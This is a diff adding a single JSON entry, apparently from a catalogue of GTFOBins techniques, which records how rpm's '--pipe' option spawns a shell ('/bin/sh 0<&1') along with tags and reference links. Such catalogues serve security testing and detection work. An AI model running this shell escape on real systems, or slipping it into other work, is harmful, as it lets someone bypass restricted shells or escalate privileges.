@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-rpm-shell-2",
+  "name": "GTFOBins · rpm (shell) #2",
+  "command": "rpm --pipe '/bin/sh 0<&1'",
+  "description": "Use rpm to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "rpm",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/rpm/#shell",
+  "upstream_id": "rpm/shell/1",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/rpm/"
+    }
+  ]
+}
